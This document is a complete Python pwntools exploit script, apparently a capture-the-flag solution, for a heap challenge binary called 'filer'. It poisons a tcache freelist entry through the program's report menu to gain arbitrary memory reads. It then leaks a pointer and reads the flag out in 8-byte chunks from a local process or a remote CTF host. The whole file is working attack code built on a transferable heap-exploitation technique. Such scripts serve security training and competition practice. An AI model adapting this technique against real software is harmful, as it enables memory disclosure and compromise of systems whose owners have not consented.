#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./filer", checksec=False)
context.log_level = "info"

HOST = "k7Xm2pQw9R.boroctf.com"
PORT = 62831
CHUNK_SIZE = 0x280
TCACHE_ENTRY_0X30 = 0x80
TARGET_FILE_DATA = context.binary.symbols["target"] + 8


def start():
    if args.REMOTE:
        return remote(HOST, PORT)

    env = {}
    if os.path.exists("./unbuffer.so"):
        env["LD_PRELOAD"] = "./unbuffer.so"

    return process(
        ["./ld-linux-x86-64.so.2", "--library-path", ".", "./filer"],
        env=env,
    )


def menu(io, choice):
    io.sendlineafter(b"[4] - Lock away your report\n", str(choice).encode())


def make_report(io, title=b"AAAA", size=CHUNK_SIZE, data=b"BBBB\n"):
    menu(io, 1)
    io.sendlineafter(b"Title (7 chars): ", title)
    io.sendlineafter(b"What is the size of the report? ", str(size).encode())
    io.sendafter(b"Report: ", data)


def close_report(io):
    menu(io, 4)


def poison_tcache_to(io, address):
    menu(io, 3)
    io.sendlineafter(b"Title (7 chars): ", b"CCCC")
    io.sendlineafter(b"What is the size of the report? ", str(CHUNK_SIZE).encode())

    payload = bytearray(CHUNK_SIZE)
    payload[0:2] = (1).to_bytes(2, "little")
    payload[TCACHE_ENTRY_0X30:TCACHE_ENTRY_0X30 + 8] = p64(address)
    io.sendafter(b"Report: ", bytes(payload[:-1]) + b"\n")


def leak_chunk(address):
    io = start()
    make_report(io)
    close_report(io)
    poison_tcache_to(io, address)
    menu(io, 1)

    out = io.recvuntil(b"' currently has:", timeout=3)
    io.close()

    start_idx = out.find(b"'") + 1
    end_idx = out.find(b"' currently has:")
    return out[start_idx:end_idx]


def main():
    flag_buf = u64(leak_chunk(TARGET_FILE_DATA).ljust(8, b"\x00"))
    log.info("target.file_data = %#x", flag_buf)

    chunks = []
    for off in range(0, 0x40, 8):
        chunk = leak_chunk(flag_buf + off)
        chunks.append(chunk)
        log.info("offset %#x -> %r", off, chunk)
        if b"}" in chunk:
            break

    flag = b"".join(chunks).split(b"\n", 1)[0].decode()
    print(flag)


if __name__ == "__main__":
    main()
